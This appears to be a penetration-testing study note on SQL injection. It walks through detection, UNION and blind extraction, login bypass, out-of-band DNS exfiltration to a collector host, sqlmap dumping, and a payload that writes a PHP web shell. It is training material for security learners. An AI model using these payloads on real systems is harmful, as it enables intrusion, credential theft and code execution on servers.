---
type: technique
platform: web
status: solid
fluency: guided
source: thm
updated: 2026-09-03
---

# SQL Injection

Unsanitised input reaches a SQL query and changes its **logic or structure** rather than just its values. What that is worth depends entirely on one thing: how the answer gets back to you. That question splits the whole technique into four classes, and picking the wrong one is what turns a confirmed injection into an afternoon of payloads that cannot possibly work.

- **In-band** — the result comes back in the page. Error-based and UNION-based. Fastest.
- **Blind, boolean** — no output, but the page differs between true and false. One bit per request.
- **Blind, time-based** — no output and no visible difference. A conditional delay is the only channel. One bit per request, slowly.
- **Out-of-band** — nothing in the response at all; the database server itself makes a network request to you.

Work down that list. Each class is slower than the one above it, and each needs a different confirmation before it is worth spending time on.

## Find the injection point and its class

**Why now** — you have a parameter whose value plausibly reaches a query: an `id`, a search term, a sort order, a category, a login field. Before any extraction you need two facts — does your input change the query, and which of the four classes you are in.

```text
'
"
1'
1 AND 1=1--
1 AND 1=2--
1' AND '1'='1
1' AND '1'='2
```

- a bare `'` first → the cheapest possible probe. If it errors, the quoting is broken and you are in, with the error text likely naming the engine
- `AND 1=1` versus `AND 1=2` → the pair that identifies **boolean** blind injection. Identical responses mean your condition changed nothing; a different response between them means the database evaluated your logic, which is a confirmed injection even with no output and no error
- send them as a **pair**, always → a single request tells you what a page looks like, never whether it changed. Sending only `1=1` and seeing a normal page proves nothing at all
- `-- -` everywhere in this note → MySQL's `--` comment needs whitespace after it, and a payload written with a bare trailing space loses it to copy-paste and to URL handling. `-- -` survives both and means the same thing; `--+` and `#` are the other safe forms. **This is the most common reason a correct payload does nothing**: the comment marker is not recognised, the tail of the original query is still there, and the statement is invalid
- `1'` versus `1` → tests whether the value is quoted in the query. Numeric context needs no quote and adding one breaks it; string context needs one and omitting it breaks it. Test both
- URL-encode `'` as `%27` and `+` as `%2b` when the payload goes in a query string

**What you will see**

- **Found (in-band, error)** — a database error in the response: `You have an error in your SQL syntax`, `unclosed quotation mark after the character string`, `ORA-01756`, `PG::SyntaxError`. Each names the engine, and the engine decides the syntax for everything below.
- **Found (in-band, union)** — no error, but the page content changes in a way that reflects your input. Go to the column-count step.
- **Found (blind, boolean)** — `1=1` and `1=2` render differently: a row appears or does not, a message changes, the response length shifts. No error, no output, and fully exploitable.
- **Empty** — identical responses to every probe, including the error-provoking `'`. Either the parameter is parameterised properly, or it never reaches a query, or the application catches errors and renders a generic page. Distinguish the last one with the time-based probe below before writing the parameter off, because a caught error and a safe query look the same.
- **Error (not the useful kind)** — a 403 with a vendor block page is a [[Security-Terms#^waf|WAF]] recognising the pattern, not the database rejecting it. It arrives fast, looks identical for every payload, and means change encoding rather than change payload. A 500 with no message is the application catching the exception; the injection may still be live.
- **Noise** — an application error page that mentions "database" in prose without an engine message. And input reflected into the HTML unchanged, which is [[XSS]], not this.

**Then** — an engine-naming error goes to the column count below. A boolean difference goes to the boolean section. Nothing at all goes to the time-based probe, which is the only one that detects an injection whose output and errors are both suppressed.

## Count the columns

**Why now** — you have in-band injection and want to use `UNION`, which requires your injected query to return **exactly** as many columns as the original. Not a guess: an exact number, and you get it in a handful of requests.

```text
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' ORDER BY 4--
```

- `ORDER BY n` → sort by the n-th column. Increment until it errors; the last number that **worked** is the column count. Cheaper than the UNION method because each request is one number rather than a growing list
- the alternative is `' UNION SELECT NULL--`, then `NULL,NULL`, and so on. `NULL` rather than `1` because it is type-compatible with every column, and a type mismatch produces the same error as a count mismatch — which makes the numeric version ambiguous
- error at 4 and success at 3 means three columns. **Off-by-one here poisons everything downstream**, since a wrong count errors identically no matter what you select
- some engines refuse `ORDER BY` in a subquery or a UNION context; fall back to the `NULL` method

**What you will see**

- **Found** — a clean page for `n`, an error for `n+1`. `Unknown column '4' in 'order clause'` names the number explicitly, which is the ideal outcome.
- **Empty** — no error at any value up to 20 or so means `ORDER BY` is not reaching the query as you think, or the application swallows errors. Switch to the `NULL` method and watch response length rather than errors.
- **Error** — `The used SELECT statements have a different number of columns` on the UNION method is the count being wrong, and it is the error you are deliberately provoking. An error at `ORDER BY 1` means the injection point or the quoting is wrong, not the count.
- **Noise** — a page that looks unchanged because the sort order genuinely does not affect the displayed output. Compare byte counts rather than eyeballing.

**Then** — with the count you go to the UNION extraction below. If nothing here produces a difference, you are not in an in-band context after all; go to the boolean section.

## UNION — pull the data into the page

**Why now** — you know the column count and the page displays query results. `UNION` appends your own result set to the original, so the application renders your data as if it were its own.

```text
0' UNION SELECT 1,2,3-- -
0' UNION SELECT 1,2,database()-- -
0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -
0' UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users-- -
```

- `0'` rather than `1'` → force the **original** query to return no rows, so the page shows only your injected row. Leave the real value in place and your data is appended below a page of genuine results, or hidden entirely when the template renders only the first row. This is the single most useful habit in the section
- `SELECT 1,2,3` first → the marker step. Whichever numbers appear on the page are the columns that are actually **rendered**; put your data in one of those and nowhere else. Selecting into a column the template ignores returns a blank page and looks like failure
- `group_concat()` → collapses many rows into one string, because the page usually shows one row. MSSQL has no `group_concat`; use `STRING_AGG` or the `FOR XML PATH` idiom
- `information_schema` → the standard metadata catalogue: `.tables` and `.columns` describe the whole database. MySQL, PostgreSQL and MSSQL all have it; **Oracle does not** (`all_tables`), and [[Security-Terms#^sqlite|SQLite]] has `sqlite_master` instead
- `WHERE table_schema=database()` → restricts to the current database. Without it you get every system table as well and the useful names are buried
- `SEPARATOR '<br>'` → renders one credential per line in HTML instead of a single unreadable run

**What you will see**

- **Found** — your numbers, then names, then data appearing where page content normally is. A string of `user:hash` pairs is the usual finish.
- **Empty** — a blank page where the marker numbers should be means the columns you selected into are not rendered; try other positions. An empty result from `information_schema` with the markers still visible means the query ran and returned no rows — check the `table_schema` filter and the engine, since it may be an engine that has no `information_schema` at all.
- **Error** — `different number of columns` is the count. `Illegal mix of collations` is a type or charset mismatch; wrap the column in `CAST(... AS CHAR)`. `Unknown column` in your own payload is usually a quoting problem in the `WHERE`.
- **Noise** — the numbers `1`, `2`, `3` appearing somewhere in the page that is not your injection (a paginator, an ID column). Use distinctive markers such as `0x41414141` or `'zzmark1'` when in doubt.

**Then** — extracted password hashes go to [[Hash-Cracking]]. Extracted plaintext credentials go to [[Authentication-Attacks]] and to every other service on the host. If the database user is privileged, the OS-shell section below is the escalation.

## Blind — boolean

**Why now** — you confirmed the database evaluates your conditions (`1=1` and `1=2` differ) but nothing is displayed. Every question you ask now has to be a yes/no question, and you rebuild the data one character at a time from the answers.

```text
1' AND (SELECT SUBSTRING(database(),1,1))='a'-- -
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>3-- -
1' AND (SELECT LENGTH(database()))=6-- -
1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77-- -
```

- ask for the **length** first → it bounds the work. Extracting a value of unknown length means you never know when to stop
- `SUBSTRING(x,n,1)` → one character at position `n`. Cycle the comparison character through the plausible alphabet and the true answer is your character
- `ASCII(...)>77` → binary search instead of linear scan. Seven requests per character instead of up to sixty-two, which is the difference between minutes and an hour
- `LIKE 'a%'` → the prefix form the original notes used, and it works the same way: extend the known prefix one character at a time
- a **baseline pair is mandatory** here. Capture the exact true page and the exact false page before extracting anything; without them you cannot read a single answer, and every result is a coin flip you are calling after the fact
- this is where you stop doing it by hand. Confirm the mechanism manually, then let sqlmap perform the thousands of requests

**What you will see**

- **Found** — the response matching your known-true baseline. That is a `1` for that bit; a response matching the false baseline is a `0`.
- **Empty** — a third kind of response, matching neither baseline, means your payload broke the query rather than answering it. Fix the syntax; do not record it as false. Recording broken queries as false is how blind extraction produces confident nonsense.
- **Error** — an error page appearing partway through a long extraction is usually rate limiting or a session expiring, not a change in the answer. Re-establish the baseline and resume.
- **Noise** — pages that vary independently of your condition: a timestamp, a rotating banner, a view counter, a [[Security-Terms#^csrf|CSRF]] token. Any of these makes length-based comparison useless; discriminate on a specific string in the body instead.

**Then** — mechanism confirmed by hand goes to sqlmap for the volume. If the login form itself is the injection point, the authentication bypass below is faster than extracting anything.

## Blind — authentication bypass

**Why now** — the injectable parameter is a login field, and you do not need any data. The application's rule is "one or more rows returned means the password was right", so you make the query return a row.

```text
' OR '1'='1'-- -
' OR 1=1 LIMIT 1-- -
admin'-- -
admin'#
' OR '1'='1' /*
```

- `admin'--` → the sharpest version, and the one to try first. It comments out the password check entirely and logs you in as a **named** user rather than as whichever row happens to be first
- `' OR '1'='1` → always true, so every row matches. When the application takes the first row you become whoever that is, which is often but not always the administrator
- `--` needs a trailing space in MySQL; `#` is the safe alternative there, `/*` for engines that want a block comment. **This one character is the difference between a bypass and a syntax error**, and the error is usually invisible because the login just fails
- try the payload in the **username** field, then the password field, then both — they frequently reach different parts of the query

**What you will see**

- **Found** — you are logged in. A session cookie is set and the response redirects to an authenticated page.
- **Empty** — the ordinary "invalid credentials" page. That means either the field is not injectable, or the comment marker is wrong for this engine, or the application compares a password **hash** rather than the submitted string, which defeats the technique even on a vulnerable query.
- **Error** — a SQL error shown on a login form is a finding in itself and confirms injection; adjust quoting and retry. A 500 with no message is the same thing with errors suppressed.
- **Noise** — an application that shows a "logged in" banner but no session. Check the cookie and load a page that requires authentication before believing it.

**Then** — a bypass is access; enumerate what that account can see. It is also confirmation of a SQL injection you can now use for extraction on the same parameter, which is often more valuable than the login itself.

## Blind — time-based

**Why now** — no output, no error, and `1=1` versus `1=2` produced no difference. There is one channel left inside the response, and it is how long the response takes. This probe is also the only reliable way to detect an injection where the application catches every error.

```text
1' AND SLEEP(5)-- -
1'; WAITFOR DELAY '0:0:5'-- -
1' AND (SELECT pg_sleep(5))-- -
1' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(5),0)-- -
```

- `SLEEP()` is MySQL, `WAITFOR DELAY` is MSSQL, `pg_sleep()` is PostgreSQL, `dbms_pipe.receive_message()` is Oracle. **Using the wrong one produces no delay and reads as "not vulnerable"** — which is exactly the false negative this section exists to prevent, so identify the engine first or try all four
- time the same request **without** the payload first. A page that normally takes 4 seconds makes a 5-second delay invisible
- vary the delay (3, then 9) and confirm the response time tracks it. One slow response is noise; a response time that follows the number you chose is proof
- `IF(condition, SLEEP(5), 0)` → the extraction form: the delay itself carries one bit of the answer. Correct, and painfully slow, which is why this is where automation stops being optional
- over a [[Security-Terms#^vpn|VPN]], tunnel latency swamps short delays. Use a longer sleep, and drop `T` from sqlmap's `--technique` if it starts producing inconsistent results

**What you will see**

- **Found** — a response that takes 5 seconds when the baseline was 200 milliseconds, repeatably, and 9 seconds when you ask for 9.
- **Empty** — no delay. Either the parameter is not injectable, or you used the wrong engine's function. Try the other three before concluding anything, because this is the single easiest false negative in the whole note.
- **Error** — a timeout at exactly 30 or 60 seconds is the web server's own execution limit, and it means the delay *did* happen but longer than the server tolerates. That is a positive result.
- **Noise** — an intermittently slow application. Repeat each measurement three times; a real time-based injection is boringly consistent.

**Then** — a confirmed delay is a confirmed injection and goes to sqlmap, because extracting anything by hand at one bit per five seconds is not a sensible use of an engagement.

## Out-of-band

**Why now** — in-band, boolean and time-based have all failed or are unusable (timing unreliable, no visible difference, no output). One channel remains: make the **database server** talk to you directly. It needs outbound network access from the database host, which is why it comes last.

```text
'; EXEC master..xp_dirtree '\\zz7f31.collector.thm\share'-- -
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.collector.thm\\share'))-- -
' AND (SELECT UTL_INADDR.get_host_address('zz7f31.collector.thm')) IS NOT NULL-- -
```

- two separate channels → the **attack** channel is your normal HTTP request; the **data** channel is the database server's outbound DNS or HTTP request to a host you control. They are different machines and different network paths, which is exactly why this works when everything else does not
- `xp_dirtree` (MSSQL) and `LOAD_FILE` on a [[Security-Terms#^unc|UNC path]] (MySQL on Windows) → both make the host resolve a hostname, and the resolution is the signal
- `CONCAT('\\\\',(SELECT database()),'.collector.thm\\share')` → the data is smuggled into the **subdomain label**, so a single DNS lookup carries the answer
- **DNS labels are capped at 63 characters** and the whole name at 253, so long values must be extracted in chunks. Hex-encode binary data or it will not survive as a hostname
- you must be listening: Burp Collaborator, Interactsh, or your own authoritative DNS. A callback nobody records is a callback that did not happen
- DNS is the more reliable carrier than HTTP, because outbound 53 is permitted far more often than outbound 80 from a database host

**What you will see**

- **Found** — a DNS query arriving at your listener with the stolen data as the leftmost label. That is both proof of injection and the data, in one event.
- **Empty** — no callback means the injection is not there, **or** the database host has no outbound route, **or** the function is disabled. These are very different and worth separating: if any other technique on this host has produced an outbound callback, the network is fine and the blocker is the database.
- **Error** — `xp_dirtree` requiring elevated permissions, or `LOAD_FILE` returning NULL because of `secure_file_priv`, are both configuration limits rather than the absence of injection.
- **Noise** — your own resolver or a scanner querying your collector domain. Match the source and the label against what you sent.

**Then** — a callback confirms injection with a working data channel; sqlmap can drive it (`--dns-domain`). No callback anywhere on this host means out-of-band techniques are closed for every vulnerability class, not just this one, which is useful to know before you try it again elsewhere.

## sqlmap — automating what you already confirmed

**Why now** — you have confirmed an injection by hand and know its class. sqlmap is for the volume: thousands of requests you would otherwise send yourself. Running it first, against an unconfirmed parameter, buries the answer in output you have no framework for reading.

```bash
sqlmap -r request.txt -p id --batch --level 2 --risk 1 --dbs
```

```bash
sqlmap -r request.txt -p id -D webapp --tables
```

```bash
sqlmap -r request.txt -p id -D webapp -T users --dump
```

- `-r request.txt` → a full HTTP request saved from [[Burp-Suite]]. **The most reliable way to run it**: headers, cookies, body and method all come along, so authenticated and POST-based testing work without further flags. `-u 'http://target.thm/search?cat=1'` handles the simple GET case, and `--cookie='PHPSESSID=...'` bolts a session onto it
- `-p id` → test only this parameter. Without it sqlmap tests everything, which is many times slower and far noisier
- `--batch` → accept the default answer to every prompt. Without it a long run stops halfway waiting for a keypress you are not there to give
- `--level 1-5` → how thorough: higher levels test cookies, headers and more payloads. `--risk 1-3` is how aggressive the payloads are; risk 3 includes `OR`-based payloads that can modify data. Start at `--level 1 --risk 1` and raise only when nothing is found
- `--technique=BEU` → restrict to boolean, error and union. **Drop `T` when working over a VPN**: tunnel latency breaks its timing measurements, and it stalls on delay-calibration prompts
- `--dbs` → `-D` → `--tables` → `-T` → `--dump` is the broad-to-narrow chain, and each step is one more question, not a fresh attack. sqlmap caches the injection point between runs
- `--os-shell` on a privileged database user attempts a shell via `xp_cmdshell` (MSSQL) or `INTO OUTFILE` into the webroot (MySQL)

**What you will see**

- **Found** — `parameter 'id' is vulnerable` followed by the payload types that worked, then the data. The injection-type list is worth reading: it tells you what you had, in the vocabulary of the sections above.
- **Empty** — `all tested parameters do not appear to be injectable` on a parameter you confirmed by hand means sqlmap needs help, not that you were wrong. Raise `--level`, name the parameter with `-p`, add `--prefix`/`--suffix` for unusual quoting, or add a tamper script for a WAF.
- **Error** — `unable to connect to the target URL` after a working start is usually rate limiting or an expired session; re-export the request from Burp. `it is not recommended to continue` is a prompt, not a failure — `--batch` answers it.
- **Noise** — enormous output. Everything before `sqlmap identified the following injection points` is negotiation, not result. `--dump` on a large table will run for a long time; add `--start 1 --stop 20` to sample first.

**Then** — dumped hashes go to [[Hash-Cracking]]; plaintext credentials go to [[Authentication-Attacks]] and to the host's other services. A successful `--os-shell` is a shell and goes to [[Shells]] to be stabilised. `--dump` on a large user table is often the end of the web phase.

## Remediation

Worth knowing because it tells you what a hardened target looks like, and therefore when to stop.

- **Parameterised queries / prepared statements** — the primary defence, and the only complete one. The query structure is fixed before user data is bound to it, so no input can change it.
- **Input validation** — whitelist the characters a field can contain. A useful second layer and not a substitute for the first.
- **Least-privilege database accounts** — limits what a successful injection reaches. This is why `--os-shell` fails on well-configured targets even when injection works.
- **Errors suppressed in production** — costs you the error-based channel and nothing else. It makes injection harder to find, not harder to exploit, which is exactly why the time-based probe exists.

## Rarely — worth one command, not worth a step

**Why now** — you have confirmed injection and pulled the data, and the data was not the answer. Two escalations are left and both depend on a database privilege you probably do not have, which is exactly why they belong here rather than in the flow above.

```sql
' UNION SELECT 1,2,'<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php'-- -
```

```sql
' UNION SELECT 1,2,LOAD_FILE('/etc/passwd')-- -
```

- Writing a file turns injection into code execution in one request, and reading one turns it into arbitrary file disclosure. Both need the file privilege, and on MySQL both also need `secure_file_priv` to be empty rather than set to a directory.
- You must already know the web root's real path. Guessing it wastes the attempt, and an error page or a misconfiguration disclosure usually contains it.
- The write is irreversible on someone else's server and leaves a file behind. Note the path so it can be reported and removed.

**What you will see**

- **Found** — the file contents rendered in the page, or your written file answering at its URL.
- **Empty** — a query that succeeds and produces nothing is the normal answer, and it means the privilege is missing rather than the path being wrong.
- **Error** — `The MySQL server is running with the --secure-file-priv option` is a definitive no. `Can't create/write to file` means the privilege exists and the directory does not permit it, which is a different and more hopeful answer.
- **Noise** — a blank column in the page can mean the file was empty, unreadable, or that you picked a column the template does not print. Confirm the column with a literal string first.

**Then** — a written web shell goes to [[Shells]] for the upgrade. A file read goes to [[Config-File-Looting]], since the same disclosure reaches configuration files holding other credentials.

## Reading the output

Match the read to the class, because the same evidence means different things in each. In-band, the data is in the page and you are reading content. Boolean-blind, you are reading a **difference against a baseline** you captured beforehand, and without that baseline no output is interpretable. Time-based, you are reading a clock, and one measurement is never enough. Out-of-band, you are not reading the response at all — the response can be a 500 while the attack succeeds perfectly, and the only place the result appears is your listener's log.

The whole-note failure to guard against: concluding "not vulnerable" from a class you never tested. An application that catches every exception and renders one page for all outcomes defeats error-based, union-based and boolean-based testing simultaneously, while remaining completely injectable. That configuration is common, and the time-based probe is the only thing in this note that sees through it. Run it before you write a parameter off.

## Next

- [[Shells]] — after `--os-shell`, stabilise the raw shell into a full TTY
- [[Source-Code-Disclosure]] — server-side source names the injectable query and the DB user
- [[Authentication-Attacks]] — the login-bypass case of the same vulnerability

## Gaps

- Nothing on second-order injection: input stored safely on one request and used unsafely in a query on a later one, which no single-request probe finds.
- No coverage of [[Security-Terms#^nosql|NoSQL]] injection, which shares the name and almost none of the syntax.
- WAF evasion is named but not worked — sqlmap tamper scripts, comment insertion and case variation each need their own steps.
- Nothing on writing files via `INTO OUTFILE` by hand, only through sqlmap's `--os-shell`.
